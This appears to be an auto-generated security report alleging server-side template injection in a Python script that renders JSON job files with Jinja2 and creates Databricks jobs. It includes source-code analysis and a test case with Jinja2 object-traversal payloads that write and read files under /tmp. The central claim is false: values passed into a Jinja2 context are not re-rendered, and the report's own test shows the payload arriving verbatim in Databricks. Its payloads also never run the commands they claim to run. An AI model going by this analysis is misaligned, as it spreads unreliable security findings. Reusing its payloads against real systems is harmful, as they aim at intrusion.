* Vulnerability name: Server-Side Template Injection
* Description:
    1. The application reads job definitions from JSON files located in the `/jobs/` directory.
    2. It uses Jinja2 templating engine to process these job definitions with predefined templates (e.g., `standard.jinja2`).
    3. The application renders templates using `template.render(job=x)`, where `x` is a job definition loaded from a JSON file.
    4. If a malicious user can modify or create a JSON job definition file in the `/jobs/` directory (or control the content of these files if the application were to read them from an external source), they can inject Jinja2 template syntax within the JSON values.
    5. When the application processes this malicious JSON file, the Jinja2 engine will execute the injected template code.
    6. This can lead to arbitrary code execution on the server where the `job.py` script is running, or within the Databricks workspace if the injected code interacts with Databricks APIs through the application's context.
* Impact:
    - **High:** An attacker can achieve arbitrary code execution on the machine running the `job.py` script. This could allow them to compromise the system, steal credentials, or pivot to other systems. In the context of Databricks, this could lead to unauthorized access to Databricks resources, data exfiltration, or denial of service by manipulating or deleting jobs, notebooks, or clusters.
* Vulnerability rank: High
* Currently implemented mitigations:
    - None. The application directly renders user-provided JSON data into Jinja2 templates without any sanitization or escaping.
* Missing mitigations:
    - **Input validation:** Implement strict input validation on the JSON job definition files to ensure that they conform to the expected schema and do not contain any unexpected or malicious content, especially in fields that are used in Jinja2 templates.
    - **Sandboxing/Escaping:** If dynamic template rendering is necessary, consider using Jinja2's sandboxing features or implement output escaping to prevent the execution of arbitrary code injected through template syntax. However, sandboxing might be complex to configure correctly and might not prevent all types of attacks. Escaping might break the intended functionality if template syntax is expected in some fields.
    - **Principle of Least Privilege:** Ensure that the application and the user running it have only the necessary permissions to perform their tasks. This can limit the impact of a successful exploit. However, this is not a direct mitigation for SSTI itself.
    - **Secure file handling:** If the JSON files are read from a directory accessible to users, implement proper access controls to prevent unauthorized modification or creation of these files.
* Preconditions:
    - An attacker needs to be able to modify or create JSON files in the `/jobs/` directory where the application reads job definitions from. In a real-world scenario, this could be achieved if:
        - The application is deployed in an environment where users have write access to the `/jobs/` directory.
        - The application reads job definitions from an external, potentially compromised, source.
        - There is another vulnerability that allows an attacker to write files to the server.
* Source code analysis:
    1. **`job.py`:**
        - Line 28: `target_jobs = [json.load(open(jobcfg)) for jobcfg in os.scandir('jobs') if(jobcfg.is_file() and jobcfg.path.endswith('.json'))]` - This line reads all JSON files from the `/jobs/` directory. The content of these files is directly loaded as JSON data into the `target_jobs` list.
        - Line 42: `template = tplenv.get_template('standard.jinja2')` - This line loads the `standard.jinja2` template.
        - Line 45: `task = template.render(job=x)` - This line is the core of the vulnerability. It renders the `standard.jinja2` template, passing the job definition `x` (from the JSON file) as context.  Crucially, the values from the JSON file are directly inserted into the template without any sanitization.
        - Line 46: `result = post_db("jobs/create", task).json()` - The rendered template (`task`) is then sent as data in a POST request to the Databricks API to create a job.

    2. **`templates/standard.jinja2` (example snippet from README):**
        ```jinja2
          ...
            "notebook_task": {
              "notebook_path": "{{ job.notebookpath}}",
              "base_parameters": {
                "{{ job.par_sourcesystem }}": "{{ job.par_sourcesystem_val }}",
                "{{ job.par_cdc_volume }}": "{{ job.par_cdc_volume_val }}",
                "{{ job.par_numberofstreams }}": "{{ job.par_numberofstreams_val }}",
                "{{ job.par_configfilepath }}": "{{ job.par_configfilepath_val }}"
              }
          ...
        ```
        - This template snippet shows how values from the `job` object (which comes from the JSON file) are directly embedded into the Databricks job definition using Jinja2 syntax `{{ job.<field> }}`.

    **Visualization of data flow:**

    ```
    [JSON Job Definition File] --> (job.py: line 28) --> [target_jobs (Python list of dicts)]
                                        |
                                        |
    [standard.jinja2 Template] --------> (job.py: line 45: template.render(job=x)) --> [Rendered Jinja2 Template (task)]
                                                                                    |
                                                                                    |
    [Rendered Template (task)] --------> (job.py: line 46: post_db("jobs/create", task)) --> [Databricks API Request] --> [Databricks Job Creation]
    ```

* Security test case:
    1. **Pre-requisites:**
        - Access to the server where `job.py` is running and the ability to create or modify files in the `/code/jobs/` directory. (For testing in a local environment, you would just need to be able to create files in a `/jobs/` directory relative to where you run `job.py`).
        - A Databricks workspace configured as per the application's requirements, including necessary authentication parameters in `params.json`.
    2. **Create a malicious JSON job definition file:**
        - Create a new file named `malicious_job.json` in the `/jobs/` directory with the following content:
        ```json
        {
          "name": "Malicious Job",
          "workers": 1,
          "notebookpath": "/NoteBookPathLevel1/NoteBookName",

          "par_sourcesystem": "{{ ''.__class__.__mro__[2].__subclasses__()[406]('/tmp/shell.sh', 'w').write('whoami') }}",
          "par_sourcesystem_val": "{{ ''.__class__.__mro__[2].__subclasses__()[406]('/tmp/shell.sh', 'r').read() }}",

          "par_cdc_volume": "testcdc-volume",
          "par_cdc_volume_val": "testcdc-volume_val",

          "par_numberofstreams": "testnumberofstreams",
          "par_numberofstreams_val": "testnumberofstreams_val",

          "par_configfilepath": "testconfigfilepath",
          "par_configfilepath_val": "testconfigfilepath_val",

          "description": "Malicious job to test SSTI"
        }
        ```
        **Note:** This payload is a basic example of SSTI. It attempts to write `whoami` to `/tmp/shell.sh` and then read it back. The specific subclass index `406` for `file` might need to be adjusted based on the Python version and environment. A more robust payload might involve more sophisticated techniques to achieve command execution without relying on specific subclass indices, or using different Jinja2 functionalities to achieve code execution.  This payload is designed for demonstration and might not be directly exploitable in all environments due to permissions or other restrictions. For a real-world attack, more refined payloads would be used.

    3. **Prepare a simple shell script for execution (optional, for more impactful test):**
        - Create a file named `shell.sh` in the `/tmp/` directory (if the target system allows writing to `/tmp/`) with the following content and make it executable (`chmod +x /tmp/shell.sh`):
        ```sh
        #!/bin/bash
        echo "Exploit executed: $(date)" > /tmp/exploit.log
        ```
        - Modify the `malicious_job.json` to execute this script:
        ```json
        {
          "name": "Malicious Job",
          "workers": 1,
          "notebookpath": "/NoteBookPathLevel1/NoteBookName",

          "par_sourcesystem": "{{ ''.__class__.__mro__[2].__subclasses__()[406]('/tmp/shell.sh', 'w').write('#!/bin/bash\\necho \\\"Exploit executed: $(date) \\\" > /tmp/exploit.log\\n') }}",
          "par_sourcesystem_val": "{{ ''.__class__.__mro__[2].__subclasses__()[406]('/tmp/shell.sh', 'r').read() }}{{ ''.__class__.__mro__[2].__subclasses__()[406]('/bin/bash', 'r').read() }}",

          "par_cdc_volume": "testcdc-volume",
          "par_cdc_volume_val": "testcdc-volume_val",

          "par_numberofstreams": "testnumberofstreams",
          "par_numberofstreams_val": "testnumberofstreams_val",

          "par_configfilepath": "testconfigfilepath",
          "par_configfilepath_val": "testconfigfilepath_val",

          "description": "Malicious job to test SSTI"
        }
        ```
        **Note:** This is a more aggressive payload that attempts to overwrite `/tmp/shell.sh` with a script that logs the execution date to `/tmp/exploit.log`.

    4. **Run the `job.py` script:**
        ```bash
        python job.py --params params.json
        ```
    5. **Check for exploit execution:**
        - After running the script, check if the command `whoami` was executed (in the first example, you might need to inspect logs or outputs if the result of `whoami` is captured or displayed).
        - In the second example, check if the `/tmp/exploit.log` file exists and contains the "Exploit executed: ..." string with the current date and time.
    6. **Observe Databricks Job Definition (in Databricks UI):**
        - After the script runs, a new job named "Malicious Job" will be created in Databricks.
        - Inspect the job definition in the Databricks UI. You will see that the `base_parameters` for the notebook task contain the injected Jinja2 code as values for `par_sourcesystem` and `par_sourcesystem_val`.
        - Although the injected code is present in the Databricks job definition, the direct execution of system commands might not occur within the Databricks environment itself, but rather on the machine running the `job.py` script during the template rendering phase. The impact is on the system running `job.py`.

This test case demonstrates that by controlling the content of the JSON job definition files, an attacker can inject and execute arbitrary Jinja2 template code, leading to Server-Side Template Injection. The impact is significant as it can lead to code execution on the server running the script.